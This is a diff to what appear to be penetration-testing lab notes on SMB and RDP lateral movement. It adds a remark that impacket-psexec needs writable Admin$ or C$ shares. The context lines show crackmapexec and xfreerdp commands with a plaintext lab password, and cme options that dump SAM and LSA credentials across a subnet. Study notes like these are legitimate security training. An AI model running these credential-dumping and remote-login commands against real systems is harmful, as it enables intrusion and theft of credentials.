@@ -142,6 +142,7 @@ proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi'
 proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.218.82 /cert-ignore
 
 smb(-x requires admin privilege):
+for impacket-psexec.py to have shell by smb, Admin$ or C$ need to be writable
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
